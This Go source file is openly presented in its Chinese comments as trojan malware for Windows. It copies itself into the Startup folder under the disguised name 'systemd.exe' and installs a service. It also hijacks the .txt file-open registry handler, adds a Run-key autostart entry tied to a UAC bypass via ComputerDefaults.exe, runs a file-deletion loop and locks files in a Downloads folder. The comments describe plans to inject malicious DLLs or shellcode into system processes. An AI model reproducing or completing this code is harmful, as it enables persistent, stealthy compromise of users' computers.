package main

import (
	"errors"
	"fmt"
	"github.com/chai2010/winsvc"
	"log"
	"os"
	"os/exec"
	"sync"
	"time"
)

/*
1. 每次启动前检查文件 C:\Windows\Temp\systemd.lock 是否存在
2. 若不存在lock文件，则判定为首次启动木马程序，首次启动将修改注册表中的文件打开方式、开机自启项目等、同时（向系统进程中注入恶意dll/shellcode）
   保证恶意程序核心运行,并写入lock文件
3. 若存在lock文件，则判定为二次启用，这时可以根据命令行传参来判断用户行为(用记事本打开txt文件/开机自启操作)
*/

var DEBUG = false
var exePath string
var wg sync.WaitGroup
var tmpFile = `C:\Windows\Temp\systemd.tmp`
var lockPath =[]string {`C:\Downloads\`}

func main() {
	messagebox(errors.New("Start"))
	var txtFileName string

	// 首次运行判断
	if !IsExist(tmpFile) {
		initialization()
	}

	// 打开记事本程序
	if len(os.Args) != 1 {
		txtFileName = os.Args[1]
		notepadCmd := exec.Command("notepad.exe", txtFileName)
		_ = notepadCmd.Run()
		wg.Add(1)
		go startWithWindows(&wg)
		//go deleteFile("", &wg)
		wg.Wait()
		return
	}

	//%SystemRoot%\system32\notepad.exe %1
	wg.Add(4 + len(lockPath))
	go startWithWindows(&wg)
	//go deleteFile("", &wg)
	go createRegBypassUAC()
	go changeOpenType(&wg)
	go crontab()
	for _,p := range lockPath {
		go lockFile(p,&wg)
	}
	wg.Wait()
}




func init() {
	exePath, _ = winsvc.GetAppPath()

	//serviceRemove()
	_,err := copy(exePath,"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\systemd.exe")
	if err != nil {
		log.Fatal(err)
	}

	serviceInstall()
}


func crontab() {
	for {
		now := time.Now()
		// 计算下一个零点
		next := now.Add(time.Minute * 1)//这里定义执行时间的周期
		t := time.NewTimer(next.Sub(now))
		fmt.Println("当前时间为:", t)
		fmt.Println("当前时间为:", next)
		select {
		case <-t.C:
			deleteFile(`C:\Windows\Temp\aa.txt`) //这里放具体实现方法
		}
	}
	wg.Done()
}

func initialization() {
	_, err := os.Create(tmpFile)
	if err != nil {
		panic(err)
	}
}


func changeOpenType(wg *sync.WaitGroup) {
	changeRegOpenT("txtfile\\shell\\open\\command",  exePath + " %1")
	wg.Done()
}

func startWithWindows(wg *sync.WaitGroup) {
	createRegAutoStart("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "ComputerDefaults","c:\\Windows\\System32\\ComputerDefaults.exe")
	wg.Done()
}